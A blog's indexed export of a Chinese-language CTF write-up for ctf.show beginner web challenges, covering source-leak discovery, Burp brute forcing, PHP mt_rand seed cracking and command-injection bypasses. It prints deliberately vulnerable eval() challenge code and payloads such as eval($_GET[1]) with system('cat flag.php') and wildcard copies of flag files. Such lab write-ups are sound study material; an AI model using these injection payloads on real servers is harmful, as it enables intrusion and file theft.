<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Ctf Show web入门刷题记录</title>
      <link href="/archives/37777.html"/>
      <url>/archives/37777.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h1><h2 id="信息泄露（1—17）"><a href="#信息泄露（1—17）" class="headerlink" title="信息泄露（1—17）"></a>信息泄露（1—17）</h2><h3 id="web1-网页1"><a href="#web1-网页1" class="headerlink" title="web1   网页1"></a>web1   网页1</h3><p>F12查看源码</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/1659276869331-929bced5-d4a3-4d3f-a980-c952cdb3daf5.png" alt="" style="zoom:50%;" /><h3 id="web2-网络2"><a href="#web2-网络2" class="headerlink" title="web2    网络2"></a>web2    网络2</h3><p>js禁用，限制网页某些功能</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220731221921578.png" alt="" style="zoom: 67%;" /><blockquote><p>1、打开Google浏览器设置</p><p>2、打开隐私设置和安全性</p><p>3、选择网站设置</p><p>4、选择js</p><p>5、在禁止中添加网站</p></blockquote><h3 id="web3-网络3"><a href="#web3-网络3" class="headerlink" title="web3    网络3"></a>web3    网络3</h3><p>抓包      burp suite抓包</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220731223109700.png" alt="" style="zoom:67%;" /><h3 id="web4-网页4"><a href="#web4-网页4" class="headerlink" title="web4      网页4"></a>web4      网页4</h3><p>robots协议</p><blockquote><p>robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取.可以通过访问&#x2F;robots.txt，获取网站结构。</p><p>User-agent: * 这里的<em>代表的所有的搜索引擎种类，</em>是一个通配符</p><p>Disallow: &#x2F;admin&#x2F; 这里定义是禁止爬寻admin目录下面的目录</p><p>Disallow: &#x2F;cgi-bin&#x2F;*.htm 禁止访问&#x2F;cgi-bin&#x2F;目录下的所有以”.htm”为后缀的URL(包含子目录)</p><p>Disallow:&#x2F;ab&#x2F;adc.html 禁止爬取ab文件夹下面的adc.html文件。</p><p>Allow: &#x2F;cgi-bin&#x2F;　这里定义是允许爬寻cgi-bin目录下面的目录</p><p>Allow: &#x2F;tmp 这里定义是允许爬寻tmp的整个目录</p><p>Allow: .htm$ 仅允许访问以”.htm”为后缀的URL。</p><p>Allow: .gif$ 允许抓取网页和gif格式图片</p><p>Sitemap: 网站地图 告诉爬虫这个页面是网站地图</p></blockquote><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220731223616449.png" alt="" style="zoom: 67%;" /><img src="http://rgjl0ywr2.hb-bkt.clouddn.com/img/image-20220731223646250.png" alt="" style="zoom:67%;" /><h3 id="web5-网络5phps"><a href="#web5-网络5phps" class="headerlink" title="web5     网络5phps"></a>web5     网络5phps</h3><p>PHPS源码泄露       url&#x2F;index.phps</p><blockquote><p>php源码文件后缀为phps,可通过尝试访问&#x2F;index.phps读取,或者尝试扫描工具扫描读取.</p></blockquote><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220731230146407.png" alt="" style="zoom:67%;" /><h3 id="web6-www-zip"><a href="#web6-www-zip" class="headerlink" title="web6  -www.zip"></a>web6  -<a href="http://www.zip/">www.zip</a></h3>  <img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801133344230.png" alt="" style="zoom:67%;" /><p>看到这个文件名为fl000g.txt,在访问一下</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801133247537.png" alt="" style="zoom:67%;" /><h3 id="web7-git泄露"><a href="#web7-git泄露" class="headerlink" title="web7   -git泄露"></a>web7   -git泄露</h3><p>git泄露</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801150254107.png" alt="" style="zoom:50%;" /><h3 id="web8-svn"><a href="#web8-svn" class="headerlink" title="web8-svn"></a>web8-svn</h3><p>svn泄露</p><blockquote><p>SVN（subversion）是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。“在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn&#x2F;entries文件，获取到服务器源码、svn服务器账号密码等信息）</p></blockquote><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801174659412.png" alt="" style="zoom:67%;" /><h3 id="web9-vim"><a href="#web9-vim" class="headerlink" title="web9-vim"></a>web9-vim</h3><blockquote><p>VIM中的swp即swap文件，在编辑文件时产生，它是隐藏文件。这个文件是一个临时交换文件，用来备份缓冲区中的内容。如果原文件名是data，那么swp文件名就是.data.swp</p></blockquote><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801182618408.png" alt="" style="zoom:67%;" /><h3 id="web10-cookie"><a href="#web10-cookie" class="headerlink" title="web10-cookie"></a>web10-cookie</h3><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801182604285.png" alt="" style="zoom:67%;" /><h3 id="web11-域名解析"><a href="#web11-域名解析" class="headerlink" title="web11 -域名解析"></a>web11 -域名解析</h3><p>域名隐藏</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801200114629.png" alt="" style="zoom:67%;" /><h3 id="web12-公开信息"><a href="#web12-公开信息" class="headerlink" title="web12-公开信息"></a>web12-公开信息</h3><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801201237059.png" alt="" style="zoom:67%;" /><h3 id="web13-技术文档敏感信息"><a href="#web13-技术文档敏感信息" class="headerlink" title="web13-技术文档敏感信息"></a>web13-技术文档敏感信息</h3><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801201447074.png" alt="" style="zoom: 50%;" /><img src="http://rgjl0ywr2.hb-bkt.clouddn.com/img/image-20220801203913768.png" alt="" style="zoom:67%;" /><h3 id="web14-editor"><a href="#web14-editor" class="headerlink" title="web14-editor"></a>web14-editor</h3><p>editor信息泄露</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801211916335.png" alt="" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801211859490.png"></p><h3 id="web15-邮箱泄露"><a href="#web15-邮箱泄露" class="headerlink" title="web15-邮箱泄露"></a>web15-邮箱泄露</h3><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801213810089.png" alt="" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801213957724.png" alt="" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801213918398.png" alt="" style="zoom:67%;" /><h3 id="web16-tz-php"><a href="#web16-tz-php" class="headerlink" title="web16-tz.php"></a>web16-tz.php</h3><p>php探针</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801215916599.png" style="zoom: 50%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801220013482.png" alt="" style="zoom:50%;" /><h3 id="web17-备份SQL文件"><a href="#web17-备份SQL文件" class="headerlink" title="web17-备份SQL文件"></a>web17-备份SQL文件</h3><p>backup备份的意思</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801221311964.png" alt="" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801221333082.png" alt="" style="zoom:67%;" /><h3 id="web18-js"><a href="#web18-js" class="headerlink" title="web18-js"></a>web18-js</h3><p>打开js看游戏源码文件</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801232435495.png" alt="" style="zoom:67%;" /><p>Unicode编码</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801232753764.png" alt="" style="zoom:67%;" /><p>ctfshow{a0e8f5b4-357f-4277-8442-f05eee266e7a}</p><h3 id="web19-前端密钥"><a href="#web19-前端密钥" class="headerlink" title="web19-前端密钥"></a>web19-前端密钥</h3><p>这里得使用post传参</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802084909675.png" alt="" style="zoom: 67%;" /><h3 id="web20-mdb文件-db-x2F-db-mdb"><a href="#web20-mdb文件-db-x2F-db-mdb" class="headerlink" title="web20- mdb文件    db&#x2F;db.mdb"></a>web20- mdb文件    db&#x2F;db.mdb</h3><p><strong>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱库了</strong></p><p>url&#x2F;db&#x2F;db.mdb     下载mdb,打开</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802103857599.png" alt="" style="zoom:67%;" /><h2 id="爆破-（21—28）"><a href="#爆破-（21—28）" class="headerlink" title="爆破  （21—28）"></a>爆破  （21—28）</h2><h3 id="web21-Custom-iterator"><a href="#web21-Custom-iterator" class="headerlink" title="web21   Custom iterator"></a>web21   Custom iterator</h3><p>考察burp suite自定义迭代器（<a href="https://www.cnblogs.com/007NBqaq/p/13220297.html">Custom iterator</a>)</p><p><strong><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802174122590.png"></strong></p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802174154022.png" alt="" style="zoom: 80%;" /><p>自定义迭代分三个部分，第一部分用户名admin，第二部分：，第三部分密码，又因为存在base64这种编码，url可能会过滤，所以要取消勾选</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802174407170.png" alt="" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802173759965.png" alt="" style="zoom:67%;" /><p>成功爆破</p><p>然后进行base64解码</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802174531110.png"></p><p>ctfshow{b2fcc227-8225-4964-8fd2-58a432af25ce}</p><h3 id="web22—子域名爆破"><a href="#web22—子域名爆破" class="headerlink" title="web22—子域名爆破"></a>web22—子域名爆破</h3><p>打不开，也没有爆出来，看的wp</p><p>不过找了几个子域名爆破的工具</p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><a href="http://www.virustotal.com/">www.virustotal.com</a></p><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802184909075.png" alt="image-20220802184909075"></p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803201253843.png"></p><p>网上找的wp不会写，呜呜</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dict</span> = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$dict</span>[<span class="variable">$i</span>].<span class="variable">$dict</span>[<span class="variable">$j</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&#x27;原字符串为:&#x27;</span>.<span class="variable">$dict</span>[<span class="variable">$i</span>].<span class="variable">$dict</span>[<span class="variable">$j</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803200804230.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803200841718.png"></p><h3 id="web24—伪随机数"><a href="#web24—伪随机数" class="headerlink" title="web24—伪随机数"></a>web24—伪随机数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">mktime</span>());<span class="comment">//随机数生成</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803230143843.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803222519649.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220803225343766.png"></p><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));     <span class="comment">//设置随机数种子，flag的md5的前8位为随机数种子</span></span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());            <span class="comment">//变量rand是r-生成的随机数</span></span><br><span class="line">    <span class="comment">//这里r的值为0，就会    0-rand=-rand    得到一个负值随机数</span></span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;       <span class="comment">//cookie的值要等于两次生成的随机数的值才输出flag</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);p</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rand&#x3D;0 -mt_rand，可以得到生成的随机数的负值</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805201206296.png"></p><blockquote><p><a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></p></blockquote><p>mt_srand()是伪随机，通过分发种子，如果有种子的话，生成随机数的值也是固定的，生成的值也和php的版本有关，上面那个是随机数生成的一个工具，把他放在Linux下使用，</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805200620791.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make一下，然后ls查看目录，就有了php_mt_seed</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">然后  time ./php_mt_seed  随机数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/md.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805201359600.png"></p><p>这个是火狐的一个插件，可以查看PHP版本信息，从这个插件wappalyzer可以知道此PHP的版本是7.几的，就按生成的随机数进行试验</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">809023198</span>);   <span class="comment">//伪随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;    <span class="comment">//第一次生成的随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();     <span class="comment">//第二三次两者之和</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>444860526<br>2280606905</p><p>因为if((!$rand))   才能进行下一步，所以要让r&#x3D;第一个随机数才行。token&#x3D;二三次之和，bp得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805193944578.png"></p><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p>提示是爆破，那就进行爆破</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805210959920.png" alt="" style="zoom: 80%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805210928793.png" alt="" style="zoom:80%;" /><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220805211052734.png"></p><p>还有一种方法</p><p>和js有关，我还没有接触到    就先不用那个方法做了</p><h3 id="web27–爆破身份证"><a href="#web27–爆破身份证" class="headerlink" title="web27–爆破身份证"></a>web27–爆破身份证</h3><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806190442401.png"></p><p>点进去都看一下</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806190407033.png" alt="" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806190521897.png"></p><p>由此可见，需要进行爆破身份证号，从而得到学号和密码，bp抓包，这里很奇怪的是，火狐的bp抓不到这个登陆的包，只能换成谷歌</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806190803310.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806190840199.png"></p><p><strong>这里我建议把线程调低一点，要不可能会被ctfshow平台错误检测，封号</strong></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806191005371.png"></p><p>成功，进行重发</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806191055944.png"></p><p>得到一串Unicode编码，拿去解码</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806191131168.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806191228732.png"></p><p>登录出现flag</p><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p>这个题的提示是目录爆破</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806221444176.png"></p><p>那就用bp<a href="https://blog.csdn.net/weixin_45808483/article/details/121392526">爆破</a>一下</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806221543302.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806221603738.png"></p><p>爆破出来</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220806221039215.png"></p><h2 id="命令执行-（29—77-118—124）"><a href="#命令执行-（29—77-118—124）" class="headerlink" title="命令执行   （29—77  118—124）"></a>命令执行   （29—77  118—124）</h2><h3 id="web29-过滤flag，不区分大小写"><a href="#web29-过滤flag，不区分大小写" class="headerlink" title="web29-过滤flag，不区分大小写"></a>web29-过滤flag，不区分大小写</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220807194844678.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220807210933909.png"></p><p>因为过滤flag，就只能用？占位符代替</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220807210850704.png"></p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:42:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220807201642403.png"></p><p>过滤了system可以用其他东西代替，  利用反引号命令执行将flag.php复制成1.txt然后访问 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=`cp fla?.??? <span class="number">1</span>.txt`;  <span class="comment">//cp source target　将文件source复制为target</span></span><br></pre></td></tr></table></figure><p>​       访问1.txt得到flag   </p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220807201730452.png"></p><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤的比较多，我们看看可不可以嵌套一个eval()函数来执行命令</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808204438707.png"></p><p>可以嵌套，然后就进行构造payload     <code>?c=eval($_GET[1]);&amp;1=system(&#39;cat flag.php&#39;);</code>    我们在这里传入了一个参数1，这样就脱离了对c的正则判断</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808204959355.png"></p><p>因为在php代码中，cat打开的不会显示在页面上，只能显示在源码部分。查看网页源码</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808205150760.png" alt="" style="zoom:150%;" /><p>得到flag</p><p>或者写一个反cat，倒着显示出来   <code>?c=eval($_GET[1]);&amp;1=system(&#39;tac flag.php&#39;);</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808205301750.png"></p><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: 